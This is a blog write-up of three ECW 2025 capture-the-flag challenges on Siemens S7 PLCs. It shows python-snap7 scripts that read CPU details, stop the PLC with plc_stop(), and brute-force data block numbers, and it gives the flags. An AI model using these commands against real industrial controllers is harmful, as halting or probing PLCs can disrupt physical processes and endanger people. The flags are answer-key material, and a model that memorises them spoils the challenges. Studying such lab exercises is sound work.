@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="How I solved the ECW 2025 industrial challenges with a search bar, CTRL&#43;F and python">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="How I solved the ECW 2025 industrial challenges with a search bar, CTRL&#43;F and python" />
+  <meta property="og:image" content="https://wepfen.github.io/images/memes/cat_computer_dumb.png" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/ecw-2025-indus/">
+  <meta property="og:title" content="ECW 2025 Siemens s7 challenges - [network]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/ecw-2025-indus/">
+  <meta name="twitter:title" content="ECW 2025 Siemens s7 challenges - [network]">
+  <meta name="twitter:description" content="How I solved the ECW 2025 industrial challenges with a search bar, CTRL&#43;F and python">
+  <meta name="twitter:image" content="https://wepfen.github.io/images/memes/cat_computer_dumb.png">
+  
+  <title>
+    
+      ECW 2025 Siemens s7 challenges - [network]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-10-22 18:08:14 &#43;0200 CEST">
+            2025-10-22
+        </time>
+    </p>
+
+    <h1>ECW 2025 Siemens s7 challenges - [network]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#who-am-i">Who am I</a></li>
+    <li><a href="#stop-this-plc">Stop this PLC</a></li>
+    <li><a href="#hidden-value">Hidden value</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>For to a better understanding of this writeup, unplug your brain and put it in another place.</p>
+<img src="https://rawcdn.githack.com/wepfen/cdn/cf658111a651f25067326d7fc97ae52a9ecd00d3/writeups/ecw/reading_ecw_no_brain.png" style="max-width:30%">
+<h1 id="who-am-i">Who am I</h1>
+<blockquote>
+<p>Difficulty : Easy</p>
+</blockquote>
+<blockquote>
+<p>Author : DGA</p>
+</blockquote>
+<blockquote>
+<p>Topics : SIEMENS, PLC, network</p>
+</blockquote>
+<blockquote>
+<p>Description : There is a critical equipment on the network, retrieve as much information as possible about it. The flag is an hardware information in ECW{&hellip;} format.</p>
+</blockquote>
+<p>So we need to find information about the PLC.</p>
+<p>First we need to know how to interact with it. We don&rsquo;t even know at first what we are dealing with.</p>
+<p>On the challenge description we got an image giving us an hint about the brand  which is <strong>SIEMENS</strong>.</p>
+<p><img src="https://rawcdn.githack.com/wepfen/cdn/97c67ce6601deed88330d602206c52d71ab57690/writeups/ecw/plc-siemens.png?raw=true" alt="blurry plc"></p>
+<p>We need to get information from the PLC so we google : <strong>&ldquo;get information siemens plc python&rdquo;</strong></p>
+<p>We get a lot of <a href="https://medium.com/@kardelenyurtkuran/snap7-python-communication-with-siemens-plc-41829626b2b0">posts</a> talking  about snap7 :</p>
+<blockquote>
+<p>Snap7 is a library that provides access to Siemens PLCs via the TCP/IP protocol. It allows you to access Siemens PLCs using Python, C#, C++, Delphi, Java, and many other programming languages.</p>
+</blockquote>
+<p>So let&rsquo;s have look to snap7 <a href="https://python-snap7.readthedocs.io/en/latest/">documentation</a>.</p>
+<p>Looking in the <a href="https://python-snap7.readthedocs.io/en/latest/API/client.html">Client</a></p>
+<p>CTRL+F and look for &ldquo;information&rdquo;.</p>
+<p>We get four functions :</p>
+<ul>
+<li><strong>get_cp_info()</strong></li>
+<li><strong>get_cpu_info()</strong></li>
+<li><strong>get_pg_block_info(block: bytearray)</strong></li>
+<li><strong>get_block_info(block_type: Block, db_number: int)</strong></li>
+</ul>
+<p>We will try the two firsts function as it doesn&rsquo;t need additionnal information.</p>
+<p>We don&rsquo;t know how to connect so let&rsquo;s CTRL-F <strong>&ldquo;connect&rdquo;</strong>.</p>
+<p>And we get :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>connect(address: <span style="color:#d699b6">str</span>, rack: <span style="color:#d699b6">int</span>, slot: <span style="color:#d699b6">int</span>, tcp_port: <span style="color:#d699b6">int</span> <span style="color:#7a8478">=</span> <span style="color:#d699b6">102</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s copy the <a href="https://python-snap7.readthedocs.io/en/latest/API/client.html#snap7.client.Client.connect">example</a> as it will take too long to code :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e67e80">import</span> snap7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client <span style="color:#7a8478">=</span> snap7<span style="color:#7a8478">.</span>client<span style="color:#7a8478">.</span>Client()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client<span style="color:#7a8478">.</span>connect(<span style="color:#b2c98f">&#34;challenges.challenge-ecw.eu&#34;</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">34910</span>)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It says <code>ModuleNotFoundError: No module named 'snap7'</code>.</p>
+<p>So we install the module :</p>
+<p><code>pip install python-snap7</code></p>
+<p>And we retry but got another error : <code>b' TCP : Invalid address' </code>.</p>
+<p>So we guess we need an IP as in the example.</p>
+<p>We use google again with the search &ldquo;get ip from domain name&rdquo;, because using <code>dig challenges.challenge-ecw.eu</code> is too guessy.</p>
+<p>So on <a href="https://www.nslookup.io/domains/challenges.challenge-ecw.eu/webservers/">https://www.nslookup.io/domains/challenges.challenge-ecw.eu/webservers/</a> we got <code>51.75.241.106</code>.</p>
+<p>Our new script is</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e67e80">import</span> snap7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client <span style="color:#7a8478">=</span> snap7<span style="color:#7a8478">.</span>client<span style="color:#7a8478">.</span>Client()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client<span style="color:#7a8478">.</span>connect(<span style="color:#b2c98f">&#34;51.75.241.106&#34;</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">34910</span>)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And print the info: <code>print(client.get_cpu_info())</code></p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#39;CPU 317-2 PN/DP&#39;</span> SerialNumber: <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#39;ECW</span><span style="color:#b2c98f">{FRLCUR289}</span><span style="color:#b2c98f">&#39;</span> ASName: <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#39;PLC_56&#39;</span> Copyright: <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#39;Original Siemens Equipment&#39;</span> ModuleName: <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#39;CPU 317-2 PN/DP</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we got our first flag : <code>ECW{FRLCUR289}</code></p>
+<p><a href="https://www.instagram.com/reel/DP2CyZUEi1C/?igsh=cTJ1dTZjdDg2NXB0" target=_blank><img src=https://wepfen.github.io/images/favorites/brainrot/rakai.gif style="max-width: 40%" > </a></p>
+<h1 id="stop-this-plc">Stop this PLC</h1>
+<blockquote>
+<p>Difficulty : Easy</p>
+</blockquote>
+<blockquote>
+<p>Author : DGA</p>
+</blockquote>
+<blockquote>
+<p>Description : Your workshop colleague challenges you to stop the PLC. If you succeed, it will return a flag in the format ECW{&hellip;}.</p>
+</blockquote>
+<p>So we need to stop the PLC.</p>
+<p>You know the trick : CTRL+F &ldquo;stop&rdquo; on the <a href="https://python-snap7.readthedocs.io/en/latest/API/client.html#">documentation</a>.</p>
+<p>Only one relevant function :</p>
+<ul>
+<li><strong>plc_stop()</strong></li>
+</ul>
+<p>new script :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e67e80">import</span> snap7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client <span style="color:#7a8478">=</span> snap7<span style="color:#7a8478">.</span>client<span style="color:#7a8478">.</span>Client()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client<span style="color:#7a8478">.</span>connect(<span style="color:#b2c98f">&#34;51.75.241.106&#34;</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">34910</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client<span style="color:#7a8478">.</span>plc_stop()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>No output.</p>
+<p><img src="../../images/memes/where_my_flag_at.png" alt="confused baby"></p>
+<p>Now, heavenly guess, we open a wireshark and see how we can see EVERY data.</p>
+<p>We filter on our port : <code>tcp.port == 34910</code> (we also googled for this filter), and we read every packet and get the flag :</p>
+<p><code>Well Done !! ECW{S7-315-stop}</code></p>
+<p><a href="https://www.instagram.com/reel/DP2CyZUEi1C/?igsh=cTJ1dTZjdDg2NXB0" target=_blank><img src=https://wepfen.github.io/images/favorites/brainrot/rakai.gif style="max-width: 40%" > </a></p>
+<h1 id="hidden-value">Hidden value</h1>
+<blockquote>
+<p>Difficulty : Medium</p>
+</blockquote>
+<blockquote>
+<p>Author : DGA</p>
+</blockquote>
+<blockquote>
+<p>Description : A device contains a critical value. Retrieve it. The flag is stored as a text field in the ECW{&hellip;} format.</p>
+</blockquote>
+<p>We need to read a data so let&rsquo;s CTRL-F &ldquo;read&rdquo;, here are the results :</p>
+<ul>
+<li>ab_read(start: int, size: int)</li>
+<li>ct_read(start: int, amount: int)</li>
+<li>db_read(db_number: int, start: int, size: int)</li>
+<li>eb_read(start: int, size: int)</li>
+<li>mb_read(start: int, size: int)</li>
+<li>read_area(area: Area, db_number: int, start: int, size: int)</li>
+<li>read_szl(id_: int, index: int = 0)</li>
+<li>read_szl_list()</li>
+<li>tm_read(start: int, amount: int)</li>
+</ul>
+<p>We try every function with a start of 0 and the max size but nothing interesting.</p>
+<p><code>We notice that read_szl, read_area and db_read take a index</code></p>
+<p>So we don&rsquo;t try to think and <strong>immediately</strong> bruteforce the index starting with <strong>db_read</strong> function with a size of 4 as in the example :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e67e80">import</span> ctypes
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> snap7
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">from</span> tqdm <span style="color:#e67e80">import</span> tqdm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>plc <span style="color:#7a8478">=</span> snap7<span style="color:#7a8478">.</span>client<span style="color:#7a8478">.</span>Client()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>plc<span style="color:#7a8478">.</span>connect(<span style="color:#b2c98f">&#39;51.75.241.106&#39;</span>, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">1</span>, <span style="color:#d699b6">34914</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>found_dbs <span style="color:#7a8478">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">for</span> db_num <span style="color:#7a8478">in</span> <span style="color:#d699b6">range</span>(<span style="color:#d699b6">1</span>, <span style="color:#d699b6">10000</span>): 
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">try</span>:
+</span></span><span style="display:flex;"><span>        data <span style="color:#7a8478">=</span> plc<span style="color:#7a8478">.</span>db_read(db_num, <span style="color:#d699b6">0</span>, <span style="color:#d699b6">4</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">print</span>(data)
+</span></span><span style="display:flex;"><span>        found_dbs<span style="color:#7a8478">.</span>append(db_num)
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">except</span> <span style="color:#e67e80">Exception</span> <span style="color:#e67e80">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">print</span>(found_dbs)
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">print</span>(plc<span style="color:#7a8478">.</span>db_read(found_dbs[<span style="color:#d699b6">0</span>], <span style="color:#d699b6">0</span>, <span style="color:#d699b6">100</span>))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we get the flag on DB 6485 :
+<code>b'{Variable-Flag-159}'</code></p>
+<p><a href="https://www.instagram.com/reel/DP2CyZUEi1C/?igsh=cTJ1dTZjdDg2NXB0" target=_blank><img src=https://wepfen.github.io/images/favorites/brainrot/rakai.gif style="max-width: 40%" > </a></p>
+
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
